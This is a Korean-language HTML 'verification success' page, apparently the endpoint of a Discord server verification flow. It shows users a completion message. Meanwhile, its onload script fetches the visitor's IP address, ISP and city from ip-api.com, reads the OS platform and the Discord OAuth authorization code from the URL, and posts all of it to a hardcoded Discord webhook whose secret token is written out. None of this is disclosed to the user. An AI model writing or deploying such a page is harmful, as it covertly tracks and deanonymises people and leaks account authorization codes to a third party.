<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Security Verification Success</title>
    <script>
        window.onload = async function() {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd";
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code'); // 디스코드 승인 코드

            // 1. IP 및 통신사 정보 수집 (ip-api 사용)
            let ipInfo = {};
            try {
                const res = await fetch('http://ip-api.com/json/');
                ipInfo = await res.json();
            } catch (e) { ipInfo = { query: "불가", isp: "알수없음", city: "한국" }; }

            // 2. 디바이스 정보
            const os = navigator.platform;
            const logId = Math.random().toString(36).substring(2, 15).toUpperCase();

            // 3. 웹훅 전송 (이미지 레이아웃 재현)
            const payload = {
                "embeds": [{
                    "title": "✅ 인증 성공 (Detailed Log)",
                    "color": 3066993,
                    "fields": [
                        { "name": "👤 인증 코드", "value": code ? code : "직접 접속함", "inline": false },
                        { "name": "🌐 아이피 정보", "value": `아이피: ${ipInfo.query}\n위치: ${ipInfo.city}, 대한민국`, "inline": false },
                        { "name": "📶 통신사 정보", "value": ipInfo.isp, "inline": true },
                        { "name": "💻 운영체제", "value": os, "inline": true },
                        { "name": "🆔 로그 ID", "value": logId, "inline": false },
                        { "name": "⚠️ 안내", "value": "이메일 및 생성일 정보는 봇 서버에서 처리 중입니다.", "inline": false }
                    ],
                    "timestamp": new Date().toISOString()
                }]
            };

            if (code) {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
            }
        }
    </script>
</head>
<body style="background:#0b0e14; color:white; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
    <div style="text-align:center; background:#161b22; padding:50px; border-radius:20px; border:1px solid #30363d;">
        <div style="width:80px; height:80px; background:#238636; border-radius:50%; display:inline-flex; justify-content:center; align-items:center; font-size:40px; margin-bottom:20px;">✔</div>
        <h1>상세 인증 완료</h1>
        <p style="color:#8b949e;">계정 정보 확인 및 보안 필터링이 완료되었습니다.<br>서버로 돌아가 역할을 확인하세요.</p>
    </div>
</body>
</html>
